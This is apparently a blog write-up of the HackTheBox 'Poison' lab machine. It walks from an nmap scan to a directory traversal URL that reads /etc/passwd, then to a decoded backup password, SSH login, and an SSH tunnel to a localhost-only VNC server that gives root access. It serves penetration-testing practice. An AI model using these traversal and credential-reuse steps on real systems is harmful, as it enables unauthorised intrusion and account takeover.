---
layout: post
title:  "HackTheBox Writeup: Poison"
date:   2018-04-29 00:00:00 -0400
categories: master
---

It all starts off with an nmap scan:
```
nmap -sS -sV -T4 -p- 10.10.10.84 -v
[snip]
Nmap scan report for 10.10.10.84
Host is up (0.18s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

Let's take a look at port 80:

![Port 80 web server](https://i.imgur.com/2AGtDSF.png)

`listfiles.php` looks interesting. 

![File enumeration](https://i.imgur.com/JvIm9BR.png)

and `pwdbackup.txt` returns:

```
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. 
Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU 
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS 
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW 
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs 
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy 
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G 
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw 
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa 
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k 
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk 
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT 
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz 
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW 
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO 
Ukd4RVdub3dPVU5uUFQwSwo= 
```
Which looks to be based64 encoded, probably encoded 13 times. So let's try it.

The final base64, which is `Q2hhcml4ITIjNCU2JjgoMA==` decodes to `Charix!2#4%6&8(0`, which is 
password to something, but what? Let's go back to the webserver. It's vulnerable to a 
directory traversal attack. We'll use this to get `/etc/passwd`.

The url `http://10.10.10.84/browse.php?file=/../../../../../../../etc/passwd` returns:
```
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # 
root:*:0:0:Charlie &:/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: 
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin operator:*:2:5:System 
&:/:/usr/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin 
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin 
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin news:*:8:8:News 
Subsystem:/:/usr/sbin/nologin man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin 
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin smmsp:*:25:25:Sendmail 
Submission User:/var/spool/clientmqueue:/usr/sbin/nologin mailnull:*:26:26:Sendmail Default 
User:/var/spool/mqueue:/usr/sbin/nologin bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin 
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin proxy:*:62:62:Packet 
Filter pseudo-user:/nonexistent:/usr/sbin/nologin _pflogd:*:64:64:pflogd privsep 
user:/var/empty:/usr/sbin/nologin _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin 
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico 
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin auditdistd:*:78:77:Auditdistd 
unprivileged user:/var/empty:/usr/sbin/nologin www:*:80:80:World Wide Web 
Owner:/nonexistent:/usr/sbin/nologin _ypldap:*:160:160:YP LDAP unprivileged 
user:/var/empty:/usr/sbin/nologin hast:*:845:845:HAST unprivileged 
user:/var/empty:/usr/sbin/nologin nobody:*:65534:65534:Unprivileged 
user:/nonexistent:/usr/sbin/nologin _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin 
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin avahi:*:558:558:Avahi 
Daemon User:/nonexistent:/usr/sbin/nologin cups:*:193:193:Cups 
Owner:/nonexistent:/usr/sbin/nologin charix:*:1001:1001:charix:/home/charix:/bin/csh 
```
We have a user called Charix. Since port 22 is also open, let's see if we can ssh into 
Charix.

![ssh into Poison as Charix](https://i.imgur.com/P4to0do.png)

Success. That `secret.zip` looks suspicious, but looks like it's password protected, and the 
version of zip on this machine doesn't allow for use of passwords.

![Older version of Zip doesn't allow for passwords](https://i.imgur.com/Ni46EUz.png)

We'll have to transfer it to our machine. Since the file size is tiny, we can just base64 
encode this, copy it to our machine, and base64 decode. (Remember to remove newlines from the 
Base64)

![Using Base64 to transfer file to kali machine](https://i.imgur.com/PaNrT4H.png)

The password, of course, is the same one we decoded earlier. Even though it's non-ASCII, I 
have a funny feeling it's 
another password, but to where?

![A non-ascii password](https://i.imgur.com/1iJPB2X.png)


The `ps -aux` command returns the line:
```
root   529   0.0  0.9  23620  8868 v0- I    03:14   0:00.04 Xvnc :1 -desktop X -httpd 
/usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry
```
And `sockstat -l` returns the lines:
```
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
```

So, the password we got from the zip file above probably allows us to log in as root via Xvnc. 
The problem is that  this machine is only accepting connections to port 5901 from the 
localhost. Traffic is unencrypted from the VNC viewer and server, so one method to encrypt 
traffic is to create an ssh tunnel. The command below will set up the appropriate tunnel.
```
root@kali:~# ssh charix@10.10.10.84 -L 6999:localhost:5901
Password for charix@Poison:
Last login: Sat May 19 03:18:03 2018 from 10.10.14.196
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
```
This is a local port forward that will forward traffic from port 6999 on our machine to 5901 
on Poison. To connect, we issue the following command from our kali machine.

```
root@kali:~# vncviewer 127.0.0.1:6999 -passwd secret
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
```

And finally, we're in as root.

![Root access on Poison](https://i.imgur.com/l6uQMf7.png)
